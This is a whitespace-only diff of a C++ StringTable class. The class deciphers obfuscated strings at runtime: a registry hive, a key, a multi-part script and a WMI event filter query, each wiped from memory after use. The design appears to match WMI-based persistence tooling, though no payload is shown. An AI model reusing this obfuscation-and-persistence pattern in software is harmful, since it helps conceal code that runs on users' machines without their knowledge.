@@ -84,7 +84,7 @@ public:
 	{
 		SecureZeroMemory(&wmi_registry_valuename[0], wmi_registry_valuename.size() * sizeof(wchar_t));
 	}
-	
+
 	std::wstring GetRegistryHive()
 	{
 		ciph.decipher(5, WMI_REGISTRY_HIVE, wmi_registry_hive);
@@ -104,7 +104,7 @@ public:
 	{
 		SecureZeroMemory(&wmi_registry_key[0], wmi_registry_key.size() * sizeof(wchar_t));
 	}
-	
+
 	std::wstring GetScript()
 	{
 		ciph.decipher(5, SCRIPT_DECIPHER_1, script_1);
@@ -124,7 +124,7 @@ public:
 		SecureZeroMemory(&script_5[0], script_5.size() * sizeof(wchar_t));
 		SecureZeroMemory(&script[0], script.size() * sizeof(wchar_t));
 	}
-	
+
 	std::wstring GetFilterQuery()
 	{
 		std::wstring sFilterQuery_1 = L"S gleHeE*FeiaugEWEv=L RRsVenv Ri'ETO tyCaetEHCMrhn ";
@@ -136,7 +136,7 @@ public:
 		ciph.decipher(5, sFilterQuery_2, filterquery_2);
 
 		sFilterQuery = filterquery_1 + GetRegistryHive() + filterquery_2 + GetRegistryValueName() + L"'";
-		
+
 		return sFilterQuery;
 	}
 	void DestroyFilterQuery()
@@ -145,7 +145,7 @@ public:
 		SecureZeroMemory(&filterquery_1[0], filterquery_1.size() * sizeof(wchar_t));
 		SecureZeroMemory(&filterquery_2[0], filterquery_2.size() * sizeof(wchar_t));
 	}
-	
+
 	~StringTable()
 	{
 		// Destroy all the strings
@@ -156,7 +156,7 @@ public:
 		DestroyScript();
 		DestroyFilterQuery();
 	}
-	
+
 	// Definitions
 std::wstring keypath;
 std::wstring wmi_registry_hive;
